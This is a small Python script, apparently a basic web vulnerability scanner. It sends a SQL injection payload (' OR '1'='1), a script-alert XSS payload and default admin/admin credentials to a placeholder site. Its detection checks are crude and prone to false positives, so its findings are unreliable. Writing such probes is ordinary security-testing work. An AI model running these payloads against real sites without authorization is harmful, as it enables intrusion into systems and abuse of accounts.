import requests
from bs4 import BeautifulSoup

# Function to test SQL Injection vulnerability
def test_sql_injection(url):
    sql_payload = "' OR '1'='1"
    response = requests.get(url, params={'id': sql_payload})
    
    if "database error" in response.text.lower() or "sql" in response.text.lower():
        print(f"SQL Injection vulnerability found at {url} with payload: {sql_payload}")
    else:
        print(f"No SQL Injection vulnerability found at {url}")

# Function to test Cross-Site Scripting (XSS) vulnerability
def test_xss(url):
    xss_payload = "<script>alert('XSS')</script>"
    response = requests.get(url, params={'input': xss_payload})
    
    if xss_payload in response.text:
        print(f"XSS vulnerability found at {url} with payload: {xss_payload}")
    else:
        print(f"No XSS vulnerability found at {url}")

# Function to test insecure authentication mechanism
def test_insecure_authentication(url, username, password):
    login_url = f"{url}/login"
    payload = {'username': username, 'password': password}
    session = requests.Session()
    response = session.post(login_url, data=payload)
    
    if "login failed" not in response.text.lower():
        print(f"Insecure authentication vulnerability found at {login_url} with credentials: {username}/{password}")
    else:
        print(f"No insecure authentication vulnerability found at {login_url}")

# Main function to run the tests
def main():
    target_url = "http://example.com"
    
    print("Running SQL Injection test...")
    test_sql_injection(target_url)

    print("\nRunning XSS test...")
    test_xss(target_url)

    print("\nRunning insecure authentication test...")
    test_insecure_authentication(target_url, "admin", "admin")

if __name__ == "__main__":
    main()
